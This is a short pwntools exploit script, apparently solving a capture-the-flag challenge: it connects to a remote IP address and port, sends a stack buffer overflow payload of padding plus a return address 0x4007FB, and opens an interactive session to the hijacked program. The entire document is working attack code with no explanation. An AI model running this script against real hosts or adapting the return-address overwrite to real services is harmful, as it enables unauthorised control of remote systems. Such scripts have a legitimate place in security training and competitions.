from pwn import*
p = process('./main')
b = 0x4007FB
p = remote('49.235.243.206',10503)
payload = '\x00'*0x20 + p64(0x40) + p64(b)
p.send(payload)
p.interactive()
